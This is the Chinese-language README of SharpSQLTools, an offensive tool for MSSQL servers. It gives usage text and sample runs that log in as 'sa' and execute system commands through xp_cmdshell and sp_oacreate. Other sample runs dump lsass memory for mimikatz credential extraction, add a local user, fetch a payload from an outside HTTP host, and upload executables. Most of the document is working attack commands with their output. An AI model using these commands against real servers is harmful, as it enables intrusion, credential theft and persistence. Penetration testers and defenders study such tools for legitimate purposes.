### 简介

和[RcoIl](http://github.com/rcoIl)一起写的小工具，可上传下载文件，xp_cmdshell和clr加载程序集执行相应操作。功能参考[mssqlproxy](https://github.com/blackarrowsec/mssqlproxy)，由于目前C#还不知如何获取SQL连接的socket，该项目中的mssqlproxy功能目前尚未实现。另外，Clr不适用于一些与线程进程相关的操作。

##### 编译环境为net 4.0 

### 吹一波[RcoIl](http://github.com/rcoIl)，关注[RcoIl](http://github.com/rcoIl)跟着大佬学C#！！！

### Usage

```
>SharpSQLTools.exe

   _____ _                      _____  ____  _   _______          _
  / ____| |                    / ____|/ __ \| | |__   __|        | |
 | (___ | |__   __ _ _ __ _ __| (___ | |  | | |    | | ___   ___ | |___
  \___ \| '_ \ / _` | '__| '_ \\___ \| |  | | |    | |/ _ \ / _ \| / __|
  ____) | | | | (_| | |  | |_) |___) | |__| | |____| | (_) | (_) | \__ \
 |_____/|_| |_|\__,_|_|  | .__/_____/ \___\_\______|_|\___/ \___/|_|___/
                         | |
                         |_|
                                                    by Rcoil & Uknow

Usage:

SharpSQLTools target username password                   - interactive console
SharpSQLTools target username password module command    - non-interactive console

Module:

enable_xp_cmdshell         - you know what it means
disable_xp_cmdshell        - you know what it means
xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
sp_oacreate {cmd}          - executes cmd using sp_oacreate
enable_ole                 - you know what it means
disable_ole                - you know what it means
upload {local} {remote}    - upload a local file to a remote path (OLE required)
download {remote} {local}  - download a remote file to a local path
enable_clr                 - you know what it means
disable_clr                - you know what it means
install_clr                - create assembly and procedure
uninstall_clr              - drop clr
clr_dumplsass              - dumplsass by clr
clr_adduser {user} {pass}  - add user by clr
clr_download {url} {path}  - download file from url by clr
exit                       - terminates the server process (and this session)

```

### 功能介绍

支持交互模式与非交互模式，交互模式直接跟目标，用户名和密码即可。非交互模式直接跟模块与命令。

```
SharpSQLTools target username password                   - interactive console
SharpSQLTools target username password module command    - non-interactive console
```



#### xp_cmdshell执行命令

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX xp_cmdshell whoami
[*] Database connection is successful!

nt authority\system

```



#### sp_oacreate执行命令

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX sp_oacreate whoami
[*] Database connection is successful!
[+] c:\windows\system32\cmd.exe /c whoami > C:\Users\Public\Downloads\1611131759069.txt
[+] Reading C:\Users\Public\Downloads\1611131759069.txt

nt authority\system

[+] Deleting C:\Users\Public\Downloads\1611131759069.txt
```



#### clr_dumplsass

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX clr_dumplsass
[*] Database connection is successful!

[*] Dumping lsass (488) to C:\Windows\Temp\debug488.out
[+] Dump successful!

[*] Compressing C:\Windows\Temp\debug488.out to C:\Windows\Temp\debug488.bin gzip file
[X] Output file 'C:\Windows\Temp\debug488.bin' already exists, removing
[*] Deleting C:\Windows\Temp\debug488.out

[+] Dumping completed. Rename file to "debug488.gz" to decompress.

[*] Operating System : Windows Server 2008 R2 Standard
[*] Architecture     : AMD64
[*] Use "sekurlsa::minidump debug.out" "sekurlsa::logonPasswords full" on the same OS/arch
```



#### clr_adduser

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX clr_adduser test1234 1qaz@WSX
[*] Database connection is successful!
[*] Adding User success
[*] Adding Group Member success
```



#### clr_download

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX clr_download "http://192.168.28.185:8001/clac.bin" "c:\Users\Public\Downloads\test.bin"
[*] Database connection is successful!
[*] Download success
```



#### upload

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX upload C:\Users\Pentest\Desktop\test\usc.exe c:\Users\Public\Downloads\11.exe
[*] Database connection is successful!
[*] Uploading 'C:\Users\Pentest\Desktop\test\usc.exe' to 'c:\Users\Public\Downloads\11.exe'...
[+] 7-1 Upload completed
[+] 7-2 Upload completed
[+] 7-3 Upload completed
[+] 7-4 Upload completed
[+] 7-5 Upload completed
[+] 7-6 Upload completed
[+] 7-7 Upload completed
[+] copy /b c:\Users\Public\Downloads\11.exe_x.config_txt c:\Users\Public\Downloads\11.exe
[+] del c:\Users\Public\Downloads\*.config_txt
[*] 'C:\Users\Pentest\Desktop\test\usc.exe' Upload completed
```



#### download

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX download c:\Users\Public\Downloads\t.txt C:\Users\Pentest\Desktop\test\t.txt
[*] Database connection is successful!
[*] Downloading 'c:\Users\Public\Downloads\t.txt' to 'C:\Users\Pentest\Desktop\test\t.txt'...
[*] 'c:\Users\Public\Downloads\t.txt' Download completed
```



### References

https://github.com/blackarrowsec/mssqlproxy
